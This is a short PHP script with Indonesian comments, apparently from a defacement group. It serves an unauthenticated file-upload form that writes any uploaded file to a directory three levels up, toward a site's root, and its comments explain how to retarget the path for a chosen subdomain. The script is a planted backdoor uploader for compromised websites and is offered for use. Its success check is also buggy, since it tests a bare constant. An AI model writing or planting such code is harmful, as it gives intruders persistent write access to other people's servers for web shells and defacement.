<?php
/*Kawan Kelam*/
echo "<form action='' enctype='multipart/form-data' method='POST'>
<input type='file' name='filena'>
<input type='submit' name='upload' value='gasken'>
</form>";
/*Cek Terlebih Dahulu Subdomain nya Cek Youtobe*/
if (isset($_POST['upload'])) {
  $cwd=getcwd();
  $tmp=$_FILES['filena']['tmp_name'];
  $file=$_FILES['filena']['name'];
  $fille = "../../../"; /*ini Untuk Ganti Directori Sesuai Root di Cwd Dan Ganti Nama Utama subdomain lebih Tuntas Lagi Cek youtobe https://youtube.com/@wibutersakititeamofficial */
  $move = move_uploaded_file($tmp, $fille .$file);
  if (move){
    echo "File berhasil terupload! => $fille/$file";
  }
  else {
    echo "File gagal terupload :(";
  }
}
?>
